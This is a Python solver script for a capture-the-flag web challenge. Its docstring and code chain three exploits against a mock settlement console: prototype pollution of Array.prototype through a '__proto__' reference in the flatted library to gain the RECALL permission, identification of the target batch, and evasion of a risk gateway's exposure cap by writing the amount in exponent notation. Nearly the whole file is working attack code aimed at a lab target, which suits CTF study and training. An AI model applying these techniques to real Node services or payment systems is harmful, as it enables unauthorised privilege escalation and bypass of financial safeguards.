#!/usr/bin/env python3
"""cutover (CSCTF 2026, Web, hard) - reproducible solver.

Three gates, three bugs:

1. TIER GATE (OPERATOR cannot RECALL).  `vendor/flatted` 3.4.1 encodes a value graph as a
   JSON array of nodes and references a node by its index written as a JSON string.  On parse
   it does `const tmp = input[value]` with `input` a real Array - so a reference whose text is
   "__proto__" reads **Array.prototype** instead of a node.  `intake.normalise` then does
   `const basis = manifest.basis ?? {}` followed by a one-level
   `merge(basis, manifest.hints)`, which turns `hints` into a write primitive onto
   Array.prototype.  `tiers.container()` keeps grants in an **Array** used as a dictionary and
   `permitted()` is `grants[action] === true`, so the lookup falls through to the polluted
   Array.prototype.  One manifest with {"basis":"__proto__","hints":{"RECALL":true}} promotes
   every session to RECALL.

2. WHICH BATCH.  The recall only reconciles for the batch the engine holds as hostile, and a
   wrong batch and a wrong value share one refusal.  It is identified from the data instead:
   the liquidity buffer's projected drain (positionMinor - projectedMinor) equals exactly one
   batch's settled aggregate, and that batch is also the only one whose settled aggregate
   disagrees with its own declaredAggregateMinor and exceeds its originator's historical max.

3. RISK GATEWAY (exposure cap 22,000,000 minor).  The gateway screens the JSON number itself
   and defers downstream whatever it cannot determine ("on_undetermined": "defer_downstream").
   It only understands plain integer literals, so writing the same value in RFC 8259 exponent
   form - 3.46e7 - is undetermined for the gateway and exactly 34600000 for Node's JSON.parse.

usage: solve.py http://host:port
"""
import hashlib
import http.cookiejar
import json
import sys
import urllib.error
import urllib.request

sys.path.insert(0, "work")
from flatted_build import poison_manifest  # noqa: E402


class Console:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.op = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def _do(self, path, raw=None, ctype=None):
        req = urllib.request.Request(self.base + path, data=raw)
        if ctype:
            req.add_header("Content-Type", ctype)
        try:
            with self.op.open(req, timeout=30) as r:
                return r.status, json.loads(r.read())
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read())

    get = lambda self, p: self._do(p)
    def post_json(self, p, raw):  return self._do(p, raw.encode(), "application/json")
    def post_text(self, p, raw):  return self._do(p, raw.encode(), "text/plain")


def find_hostile(console):
    buffer = console.get("/reference/buffer")[1]["buffer"]
    drain = buffer["positionMinor"] - buffer["projectedMinor"]
    batches = console.get("/batches")[1]["batches"]
    for b in batches:
        settled = sum(i["amountMinor"] for i in b["instructions"])
        if settled == drain:
            return b["id"], settled
    for r in console.get("/api/v1/receipts")[1].get("receipts", []):
        if r.get("settledAggregateMinor") == drain:
            return r["batch"], drain      # already recalled on this instance
    raise SystemExit("no batch accounts for the projected buffer drain of %d" % drain)


def main(base):
    c = Console(base)
    print("[*] session:", c.get("/api/v1/session")[1]["session"]["grants"])

    batch, settled = find_hostile(c)
    print("[*] hostile batch %s, settled aggregate %d minor" % (batch, settled))

    # 1. pollute Array.prototype through the flatted "__proto__" reference.
    #    normalise() runs before validate(), so the write lands even if the manifest is
    #    then rejected - the 400 below is cosmetic.
    bic = c.get("/reference/participants")[1]["participants"][0]["bic"]
    value_date = c.get("/api/v1/schema")[1]["value_day"]
    poison = poison_manifest("MRN-FIXUP-%s" % batch[-6:], bic, value_date,
                             [{"amountMinor": 1000, "counterparty": "MCSA/LIQ"}])
    status, body = c.post_text("/api/v1/manifests", poison)
    print("[*] poisoned manifest queued:", status, body)
    print("[*] grants now:", c.get("/api/v1/session")[1]["session"]["grants"],
          "(engine-side Array.prototype.RECALL is set; the console still reports the tier)")

    # 2 + 3. recall, value written in exponent form so the risk gateway defers it
    digits = str(settled)
    mantissa = digits.rstrip("0") or "0"
    value = mantissa[0] + ("." + mantissa[1:] if len(mantissa) > 1 else "") + \
        "e" + str(len(digits) - 1)          # 34600000 -> 3.46e7 : undetermined for the gateway
    unlock = hashlib.sha256(("cutover|%s|%d" % (batch, settled)).encode()).hexdigest()
    body = '{"type":"RECALL","batch":"%s","value":%s,"unlock":"%s"}' % (batch, value, unlock)
    status, res = c.post_json("/api/v1/instructions", body)
    print("[*] recall ->", status, json.dumps(res)[:200])

    if status == 200:
        print("FLAG:", res["receipt"]["authorization"])
        return
    # the recall is one-shot per instance: if it already ran, read the issued receipt
    receipts = c.get("/api/v1/receipts")[1].get("receipts", [])
    for r in receipts:
        if r.get("batch") == batch and r.get("authorization"):
            print("[*] recall already executed on this instance; receipt", r["id"])
            print("FLAG:", r["authorization"])
            return
    raise SystemExit("recall refused and no receipt on file: %s" % res)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else open("work/URL").read().strip())
